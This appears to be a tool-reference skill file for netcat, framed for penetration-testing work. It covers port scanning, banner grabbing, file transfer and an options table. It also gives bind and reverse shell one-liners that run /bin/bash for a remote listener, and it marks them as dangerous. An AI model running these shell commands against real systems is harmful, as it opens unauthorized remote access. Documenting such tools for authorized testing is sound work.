---
name: netcat
description: Read and write data across network connections using TCP or UDP. Known as the "TCP/IP swiss army knife," it is used for port scanning, banner grabbing, transferring files, creating reverse/bind shells, and network debugging. Use during reconnaissance, vulnerability analysis, and exploitation phases of a penetration test.
---

# netcat

## Overview
Netcat (traditional) is a versatile networking utility for reading from and writing to network connections. It supports both TCP and UDP and is designed to be a reliable back-end tool for scripts and programs. Category: Reconnaissance / Information Gathering, Vulnerability Analysis.

## Installation (if not already installed)

Assume netcat is already installed (usually as `nc` or `nc.traditional`). If missing:

```bash
sudo apt install netcat-traditional
```

## Common Workflows

### Port Scanning
Scan a range of TCP ports (1-1000) on a target with verbosity and no DNS resolution:
```bash
nc -vnz 192.168.1.10 1-1000
```

### Banner Grabbing
Connect to a specific port to identify the service version:
```bash
nc -vn 192.168.1.10 80
```

### File Transfer
On the receiving machine (listener):
```bash
nc -l -p 1234 > received_file
```
On the sending machine:
```bash
nc -n 192.168.1.5 1234 < file_to_send
```

### Simple Bind Shell (Dangerous)
Listen on a port and execute a shell upon connection:
```bash
nc -l -p 4444 -e /bin/bash
```

### Reverse Shell (Dangerous)
Connect back to a listener and provide a shell:
```bash
nc -n 10.10.10.5 4444 -e /bin/bash
```

## Complete Command Reference

### Usage Patterns
- **Connect to a host:** `nc [-options] hostname port[s] [ports] ...`
- **Listen for inbound:** `nc -l -p port [-options] [hostname] [port]`

### Options

| Flag | Description |
|------|-------------|
| `-c shell commands` | Specify shell commands to execute after connect (uses `/bin/sh`). **Dangerous.** |
| `-e filename` | Program to execute after connect (e.g., `/bin/bash`). **Dangerous.** |
| `-b` | Allow broadcasts. |
| `-g gateway` | Source-routing hop point[s], up to 8. |
| `-G num` | Source-routing pointer: 4, 8, 12, ... |
| `-h` | Display the help/usage summary. |
| `-i secs` | Delay interval for lines sent and ports scanned. |
| `-k` | Set keepalive option on the socket. |
| `-l` | Listen mode, for inbound connections. |
| `-n` | Numeric-only IP addresses; do not perform DNS resolution. |
| `-o file` | Hex dump of traffic to the specified file. |
| `-p port` | Local port number (required for listen mode). |
| `-r` | Randomize local and remote ports. |
| `-q secs` | Quit after EOF on stdin and a delay of specified seconds. |
| `-s addr` | Specify local source address. |
| `-T tos` | Set Type Of Service (TOS). |
| `-t` | Answer TELNET negotiation. |
| `-u` | UDP mode (default is TCP). |
| `-v` | Verbose mode. Use `-vv` for more verbosity. |
| `-w secs` | Timeout for connections and final net reads. |
| `-C` | Send CRLF as line-ending. |
| `-z` | Zero-I/O mode. Used for scanning (sends no data). |

### Port Specification
- Port numbers can be individual (e.g., `80`) or ranges (e.g., `20-25`).
- Ranges are inclusive.
- Hyphens in port names must be backslash escaped (e.g., `ftp\-data`).

## Notes
- The `-e` and `-c` options are often disabled in some distributions for security reasons, but are present in `netcat-traditional`.
- When scanning, `-z` is essential to avoid hanging on open connections.
- Use `-n` whenever possible to speed up operations by avoiding DNS lookups.